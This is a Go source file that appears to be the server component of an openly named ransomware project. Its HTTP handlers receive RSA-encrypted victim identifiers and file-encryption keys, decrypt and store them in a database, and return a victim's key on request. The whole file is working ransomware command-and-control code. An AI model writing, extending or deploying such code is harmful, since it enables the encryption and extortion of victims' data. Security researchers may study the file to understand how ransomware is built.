package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/labstack/echo"
	"github.com/mauri870/ransomware/repository"
	"github.com/mauri870/ransomware/rsa"
)

func addKeys(c echo.Context) error {
	// Check if payload parameter exists
	payloadValue := c.FormValue("payload")
	if payloadValue == "" {
		return c.JSON(http.StatusUnprocessableEntity, ApiResponseNoPayload)
	}

	// Decode the base64 string to []byte
	payload, err := base64.StdEncoding.DecodeString(payloadValue)
	if err != nil {
		return c.JSON(http.StatusBadRequest, ApiResponseBadRequest)
	}

	// Decrypt the payload
	jsonPayload, err := rsa.Decrypt(PRIV_KEY, payload)
	if err != nil {
		return c.JSON(http.StatusUnprocessableEntity, ApiResponseBadRSAEncryption)
	}

	// Parse the json keys
	keys, err := parseJsonKeys(jsonPayload)
	if err != nil {
		// Bad Json
		return c.JSON(http.StatusBadRequest, ApiResponseBadJson)
	}

	// If nothing goes wrong, persist the keys...
	db := repository.Open(Database)
	defer db.Close()

	if !db.IsAvailable(keys["id"]) {
		// Id already exists
		return c.JSON(http.StatusConflict, ApiResponseDuplicatedId)
	}

	db.CreateOrUpdate(keys["id"], keys["enckey"])

	// Success \o/
	return c.NoContent(http.StatusNoContent)
}

func getEncryptionKey(c echo.Context) error {
	id := c.Param("id")
	if len(id) != 32 {
		return c.JSON(http.StatusBadRequest, ApiResponseBadRequest)
	}

	// If nothing goes wrong, try get the encryption key...
	db := repository.Open(Database)
	defer db.Close()

	enckey, err := db.Find(id)
	if err != nil {
		return c.JSON(http.StatusTeapot, ApiResponseResourceNotFound)
	}

	return c.JSON(http.StatusOK, fmt.Sprintf(`{"status": 200, "enckey": "%s"}`, enckey))
}

// Parse the json keys
func parseJsonKeys(body []byte) (map[string]string, error) {
	var keys map[string]string
	if err := json.Unmarshal(body, &keys); err != nil {
		return keys, err
	}

	return keys, nil
}
